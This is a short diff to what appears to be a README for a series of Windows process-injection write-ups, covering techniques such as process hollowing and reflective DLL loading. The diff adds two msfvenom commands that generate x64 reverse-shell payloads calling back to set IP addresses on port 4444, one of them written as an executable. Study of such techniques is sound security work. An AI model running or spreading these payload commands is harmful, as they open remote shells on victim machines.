@@ -24,6 +24,13 @@ Each writeup covers:
 | 6 | 15 | Process hollowing | HARD | MSVC + x64 assembly basics |
 | 7 | 16 | Reflective / manual-map DLL | HARD | Done #13 + PE format knowledge |
 
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f c
+
+msfvenom -p windows/x64/meterpreter/shell_reverse_tcp LHOST=10.11.37.59 LPORT=4444 -f exe -o common.exe
+
+```
+
 ## Mental model
 
 All seven techniques solve the same problem: **get code execution inside another process**.
